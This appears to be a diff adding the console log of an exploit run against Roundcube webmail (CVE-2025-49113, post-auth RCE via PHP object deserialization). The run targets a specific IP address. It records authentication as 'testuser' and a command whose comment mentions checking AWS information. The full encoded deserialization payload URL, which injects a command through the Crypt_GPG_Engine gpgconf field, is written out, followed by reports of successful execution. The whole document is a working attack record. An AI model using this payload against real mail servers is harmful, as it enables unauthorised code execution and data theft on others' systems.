@@ -1,0 +1,26 @@
+﻿### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
+
+### Retrieving CSRF token and session cookie...
+
+### Authenticating user: testuser
+
+### Authentication successful
+
+### Command to be executed: 
+# AWS 통합 정보 확인 (첫 500 바이트)
+echo ===
+
+### Injecting payload...
+
+### End payload: http://13.125.104.131:30083/?_from=edit-%21%C6%22%C6%3B%C6i%C6%3A%C60%C6%3B%C6O%C6%3A%C61%C66%C6%3A%C6%22%C6C%C6r%C6y%C6p%C6t%C6_%C6G%C6P%C6G%C6_%C6E%C6n%C6g%C6i%C6n%C6e%C6%22%C6%3A%C61%C6%3A%C6%7B%C6S%C6%3A%C62%C66%C6%3A%C6%22%C6%5C%C60%C60%C6C%C6r%C6y%C6p%C6t%C6_%C6G%C6P%C6G%C6_%C6E%C6n%C6g%C6i%C6n%C6e%C6%5C%C60%C60%C6_%C6g%C6p%C6g%C6c%C6o%C6n%C6f%C6%22%C6%3B%C6S%C6%3A%C65%C67%C6%3A%C6%22%C6%23%C6+%C6A%C6W%C6S%C6+%C6%5C%C6e%C6d%C6%5C%C68%C66%C6%5C%C6b%C65%C6%5C%C6e%C6d%C6%5C%C69%C65%C6%5C%C6a%C69%C6+%C6%5C%C6e%C6c%C6%5C%C6a%C60%C6%5C%C69%C65%C6%5C%C6e%C6b%C6%5C%C6b%C63%C6%5C%C6b%C64%C6+%C6%5C%C6e%C6d%C6%5C%C69%C69%C6%5C%C69%C65%C6%5C%C6e%C6c%C6%5C%C69%C6d%C6%5C%C6b%C68%C6+%C6%28%C6%5C%C6e%C6c%C6%5C%C6b%C62%C6%5C%C6a%C6b%C6+%C65%C60%C60%C6+%C6%5C%C6e%C6b%C6%5C%C6b%C60%C6%5C%C69%C64%C6%5C%C6e%C6c%C6%5C%C69%C6d%C6%5C%C6b%C64%C6%5C%C6e%C6d%C6%5C%C68%C6a%C6%5C%C6b%C68%C6%29%C6%5C%C60%C6a%C6e%C6c%C6h%C6o%C6+%C6%3D%C6%3D%C6%3D%C6%3B%C6%23%C6%22%C6%3B%C6%7D%C6i%C6%3A%C60%C6%3B%C6b%C6%3A%C60%C6%3B%C6%7D%C6%22%C6%3B%C6%7D%C6%7D%C6&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload
+
+### Payload injected successfully
+
+### Executing payload...
+
+### TIMING: pre-logout GET / took 0.563s
+
+### TIMING: logout GET took 0.070s
+
+### Exploit executed successfully
+
